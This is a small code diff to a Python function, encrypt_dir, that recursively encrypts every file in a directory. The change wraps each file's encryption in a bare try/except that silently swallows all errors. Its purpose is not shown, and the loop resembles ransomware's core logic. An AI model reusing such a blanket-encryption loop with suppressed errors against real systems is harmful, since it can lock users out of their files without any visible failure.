@@ -68,7 +68,10 @@ def encrypt_dir(directory, key):
     if len(files) > 0:
         for file in files:
             path = root + '/' + file
-            encrypt(path, key)
+            try:
+                encrypt(path, key)
+            except:
+                pass
 
     if len(directories) > 0:
         for directory in directories:
